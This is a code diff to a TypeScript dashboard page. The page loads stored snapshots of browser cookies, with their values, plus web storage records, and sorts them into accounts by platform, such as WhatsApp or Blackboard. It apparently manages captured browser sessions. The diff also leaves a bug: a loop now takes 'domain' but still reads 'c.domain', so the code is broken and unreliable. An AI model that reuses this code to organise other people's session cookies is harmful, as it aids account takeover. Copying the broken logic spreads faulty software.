@@ -62,11 +62,12 @@ export default function SessionsPage() {
     return "active";
   };
 
-  const getPrimaryDomainFromCookies = (sessionCookies: { domain: string }[]): string => {
-    if (sessionCookies.length === 0) return "unknown.com";
+  const getPrimaryDomainFromCookies = (sessionCookies: { domain: string }[], extraDomains: string[] = []): string => {
+    const usageList = extraDomains.length > 0 ? extraDomains : sessionCookies.map(c => c.domain);
+    if (usageList.length === 0) return "unknown.com";
     
     const domainCounts: Record<string, number> = {};
-    sessionCookies.forEach(c => {
+    usageList.forEach(domain => {
       // Clean domain: Remove leading dot and convert to lowercase
       const d = c.domain.replace(/^\./, "").toLowerCase();
       // Ignore common noise domains
@@ -82,9 +83,11 @@ export default function SessionsPage() {
     return entries.sort((a, b) => b[1] - a[1])[0][0];
   };
 
-  const identifyAccount = (sessionCookies: { domain: string, name: string, value: string, expiration_date: number | null }[], fallbackId: string): AccountInfo => {
+  const identifyAccount = (sessionCookies: { domain: string, name: string, value: string, expiration_date: number | null }[], fallbackId: string, extraDomains: string[] = []): AccountInfo => {
     const health = getHealthStatus(sessionCookies);
-    const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");
+    // Use extraDomains if provided, otherwise fallback to cookies
+    const allDomains = extraDomains.length > 0 ? extraDomains : sessionCookies.map(c => c.domain);
+    const domainStr = allDomains.map(d => d.toLowerCase()).join(" ");
     
     // PRIORITY AUTH DETECTION: Check for platform-specific auth cookies FIRST
     // This is more reliable than domain frequency since Google/YouTube are omnipresent
@@ -167,7 +170,7 @@ export default function SessionsPage() {
     }
 
     // Generic fallback
-    const primaryDomain = getPrimaryDomainFromCookies(sessionCookies);
+    const primaryDomain = getPrimaryDomainFromCookies(sessionCookies, extraDomains);
     const capitalizedName = primaryDomain.split('.')[0].charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
     return { platform: capitalizedName || "External", identifier: fallbackId || "Active Session", icon: Shield, color: "text-blue-400", health, domain: primaryDomain };
   };
@@ -183,21 +186,49 @@ export default function SessionsPage() {
     if (sessionData) {
       const sessionIds = sessionData.map(s => s.id);
       
-      // UNIVERSAL FETCH: Get a broad sample of cookies for ALL sessions
+      // UNIVERSAL FETCH: Get a broad sample of cookies AND storage for ALL sessions
       // This ensures we see ALL domains (WhatsApp, Blackboard, etc.) not just Google/YouTube
       const { data: allCookies } = await supabase
         .from("cookies")
         .select("snapshot_id, domain, name, value, expiration_date")
         .in("snapshot_id", sessionIds)
         .limit(10000);
+
+      const { data: allStorage } = await supabase
+        .from("web_storage")
+        .select("snapshot_id, domain, storage_type")
+        .in("snapshot_id", sessionIds)
+        .limit(2000);
       
       const newAccountMap: Record<string, AccountInfo> = {};
       sessionData.forEach(session => {
         const sessionCookies = (allCookies || []).filter(c => c.snapshot_id === session.id);
-        newAccountMap[session.id] = identifyAccount(sessionCookies, session.user_id);
+        const sessionStorage = (allStorage || []).filter(s => s.snapshot_id === session.id);
+        
+        // Combine domains for identification
+        const combinedDomains = [
+            ...sessionCookies.map(c => c.domain),
+            ...sessionStorage.map(s => s.domain)
+        ];
+        
+        const identity = identifyAccount(sessionCookies, session.user_id, combinedDomains);
+        
+        // FILTER: Only include if identified properly OR has data
+        if (identity.domain !== "unknown.com" || sessionCookies.length > 0 || sessionStorage.length > 0) {
+           newAccountMap[session.id] = identity;
+        } else {
+           // Mark for filtering
+           newAccountMap[session.id] = { ...identity, filterMe: true };
+        }
       });
-      setAccountMap(newAccountMap);
-      setSessions(sessionData);
+      
+      // Filter sessions
+      const validSessions = sessionData.filter(s => !newAccountMap[s.id]?.filterMe);
+      const validAccountMap = {};
+      validSessions.forEach(s => validAccountMap[s.id] = newAccountMap[s.id]);
+      
+      setAccountMap(validAccountMap);
+      setSessions(validSessions);
     }
     setLoading(false);
   };
